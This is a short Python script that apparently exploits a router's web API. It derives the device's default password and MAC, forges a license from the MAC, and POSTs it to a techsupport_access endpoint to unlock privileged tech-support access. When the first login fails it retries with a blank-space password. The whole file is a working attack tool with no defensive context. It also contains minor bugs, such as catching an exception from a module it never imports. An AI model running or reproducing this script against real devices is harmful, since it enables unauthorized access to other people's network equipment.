#!/usr/bin/env python3

import json
import sys
import requests
from requests.auth import HTTPDigestAuth, HTTPBasicAuth
from get_plt import get_plt
from webapi import WebAPI
from make_lic import create_license
router_ip = sys.argv[1]


plt_data = get_plt(router_ip)
dp = plt_data['default_password']
mac = plt_data['wlan_mac']

lic = create_license(mac)
# jsonstr is all you need to use in a request
jsonstr = lic[lic.find('{'):]

print(str(jsonstr))

wa = WebAPI(router_ip, password=dp, scheme='http',port=80);
try:
    d = wa.post(path='/api/control/system/techsupport_access', data=lic);
except webapi.HTTPError as e:
    print("Password failure, trying agin with space");
    wa = WebAPI(router_ip, password=' ', scheme='http',port=80);


d = wa.post(path='/api/control/system/techsupport_access', data=jsonstr);

print(d);
